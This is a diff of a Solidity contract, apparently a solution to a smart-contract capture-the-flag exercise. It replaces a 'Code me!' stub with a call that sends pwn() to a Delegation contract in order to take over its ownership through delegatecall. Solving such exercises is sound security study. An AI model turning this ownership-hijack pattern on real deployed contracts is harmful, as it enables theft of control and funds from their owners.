@@ -2,6 +2,8 @@
 pragma solidity ^0.8.9;
 import "./Delegation.sol";
 
+import "hardhat/console.sol";
+
 contract AttackingDelegation {
     address public contractAddress;
 
@@ -10,6 +12,11 @@ contract AttackingDelegation {
     }
 
     function hackContract() external {
-        // Code me!
+        console.log("Hacking contract...");
+        console.log("address: ", address(this));
+        (bool success, ) = contractAddress.call(
+            abi.encodeWithSignature("pwn()")
+        );
+        console.log("success: ", success);
     }
 }
